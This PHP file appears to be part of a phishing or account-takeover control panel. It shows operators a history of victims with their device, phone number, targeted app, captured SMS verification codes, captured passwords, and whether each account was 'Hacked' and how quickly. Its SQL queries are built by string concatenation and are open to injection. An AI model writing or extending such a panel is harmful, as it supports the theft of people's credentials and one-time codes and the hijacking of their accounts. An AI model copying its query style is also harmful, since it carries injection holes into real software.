<?php
$history = $c->query("SELECT * FROM result ORDER BY timer DESC");
$his_row = $history->num_rows;

if($his_row > 0) {
?>
<div class="container" style="padding-left: 0px !important;padding-right: 0px !important;">
	<div class="history-table">
		<table class="table table-bordered table-inverse table-hover">
		<thead>
			<tr>
				<th>ID</th>
				<th>Device</th>
				<th>Phone</th>
				<th>App</th>
				<th>Version</th>
				<th>Code</th>
				<th>Password</th>
				<th>Alerted at</th>
				<th>Access at</th>
				<th>Hacked</th>
				<th>Duration</th>
				<th>Date</th>
			</tr>
		</thead>
		<tbody>
			<?php
			while ($zip = $history->fetch_array()) {

			$acc = $c->query("SELECT * FROM access WHERE request_id = '".$zip['request_id']."'");
			$acz = $acc->fetch_array();

			$plat = $c->query("SELECT * FROM platform WHERE request_id = '".$zip['request_id']."'");
			$plaz = $plat->fetch_array();

			$pas = $c->query("SELECT * FROM password WHERE password = 'yes' AND request_id = '".$zip['request_id']."'");
			$psz = $pas->fetch_array();

			if ($pas->num_rows > 0) {
				$pass = $c->query("SELECT * FROM ptemp WHERE verify = 'valid' AND request_id = '".$zip['request_id']."'");
				$paz = $pass->fetch_array();
				$passer = '<span class="text-muted">'.$paz['password'].'</span>';
			}else {
				$passer = '<span class="text-muted">-</span>';
			}

			$alert = $c->query("SELECT * FROM alert WHERE request_id = '".$zip['request_id']."'");
			$arz = $alert->fetch_array();

			$sms = $c->query("SELECT * FROM sms WHERE code != '' AND request_id = '".$zip['request_id']."'");
			$coz = $sms->fetch_array();
			
			if ($sms->num_rows > 0) {
				$codeee = $c->query("SELECT * FROM stemp WHERE request_id = '".$zip['request_id']."' AND verify = 'valid' OR verify = 'check'");
				$cozer = $codeee->fetch_array();
				$coder = '<span class="text-muted">'.$cozer['code'].'</span>';
			}else {
				$coder = '<span class="text-muted">-</span>';
			}


			$hacked = $c->query("SELECT * FROM accounts WHERE hacked = 1 AND request_id = '".$zip['request_id']."'");
			$haz = $hacked->num_rows;
			if ($haz > 0) {
				$hack = $hacked->fetch_array();
			}
			$cog = new cog();
			$id = $zip['request_id'];
			$device = ucwords($acz['device']);
			$phone = ($arz['phone'] != '') ? $arz['phone'] : '-';
			$app = ucwords($plaz['app']);
			$version = $plaz['version'];
			$code = $coder;
			$password = $passer;
			$art_at = $cog->time_ago($arz['timer']);
			$acc_at = $cog->time_ago($acz['timer']);
			$hacked = ($haz != 0) ? '<span class="text-success">Hacked</span>' : '<span class="text-danger">Failed</span>';
			$date = $cog->time_ago($zip['timer']);
			$dur = ($haz != 0) ? $cog->time_left2($acz['timer'],$hack['timer']) : '<span class="text-dark">-</span>';
			?>
			<tr>
				<td><?php echo $id; ?></td>
				<td><?php echo $device; ?></td>
				<td class="text-center"><?php echo $phone; ?></td>
				<td><?php echo $app; ?></td>
				<td><?php echo $version; ?></td>
				<td class="text-center"><?php echo $code; ?></td>
				<td class="text-center"><?php echo $password; ?></td>
				<td><?php echo $art_at; ?></td>
				<td><?php echo $acc_at; ?></td>
				<td><?php echo $hacked; ?></td>
				<td class="text-center"><?php echo $dur; ?></td>
				<td><?php echo $date; ?></td>
			</tr>
			<?php
			}
			?>
		</tbody>
	</table>
	<button class="card-link btn btn-outline-info float-right mr-3" onclick="showme('home')"><i class="fa fa-arrow-left "></i> Back</button>
	<button class="card-link btn btn-outline-info float-right mr-3" onclick="showme('all_history')"><i class="fa fa-refresh "></i> Refresh</button>
	</div>
</div>
<?php
}else {
?>
	<center><h5 class="text-muted">no result</h5></center>
<?php
}
?>